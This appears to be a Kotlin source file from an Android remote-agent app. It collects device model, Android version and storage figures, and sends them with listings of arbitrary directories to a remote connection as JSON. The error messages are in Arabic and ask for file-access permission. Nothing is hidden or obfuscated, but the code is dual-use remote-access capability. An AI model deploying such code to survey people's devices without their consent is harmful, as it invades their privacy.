package com.kero.remoteagent

import android.os.Build
import android.os.Environment
import android.os.StatFs
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object DeviceAndFileManager {
    fun sendDeviceInfo() {
        try {
            val statFs = StatFs(Environment.getDataDirectory().path)
            val availableBytes = statFs.availableBytes
            val totalBytes = statFs.totalBytes
            
            val msg = JSONObject().apply {
                put("type", "device_info")
                put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("storage_total_gb", totalBytes / (1024 * 1024 * 1024))
                put("storage_available_gb", availableBytes / (1024 * 1024 * 1024))
                put("status", "online")
            }
            RemoteConnection.sendJson(msg)
        } catch (e: Exception) { 
            e.printStackTrace() 
        }
    }

    fun listFiles(directoryPath: String) {
        try {
            val dir = File(directoryPath)

            if (!dir.exists() || !dir.isDirectory) {
                RemoteConnection.sendJson(
                    JSONObject()
                        .put("type", "file_error")
                        .put("message", "المجلد غير موجود أو غير قابل للوصول: $directoryPath")
                )
                return
            }

            val children = dir.listFiles()
            if (children == null) {
                RemoteConnection.sendJson(
                    JSONObject()
                        .put("type", "file_error")
                        .put("message", "تم رفض الوصول إلى المجلد. فعّل إذن الوصول للملفات على الهاتف.")
                )
                return
            }

            val filesArray = JSONArray()
            children
                .sortedWith(compareBy<File> { !it.isDirectory }.thenBy { it.name.lowercase() })
                .forEach { file ->
                    filesArray.put(
                        JSONObject()
                            .put("name", file.name)
                            .put("is_directory", file.isDirectory)
                            .put("size", file.length())
                            .put("last_modified", file.lastModified())
                    )
                }

            RemoteConnection.sendJson(
                JSONObject()
                    .put("type", "file_list")
                    .put("path", directoryPath)
                    .put("files", filesArray)
            )
        } catch (e: Exception) {
            RemoteConnection.sendJson(
                JSONObject()
                    .put("type", "file_error")
                    .put("message", e.message ?: "تعذر قراءة الملفات")
            )
        }
    }
}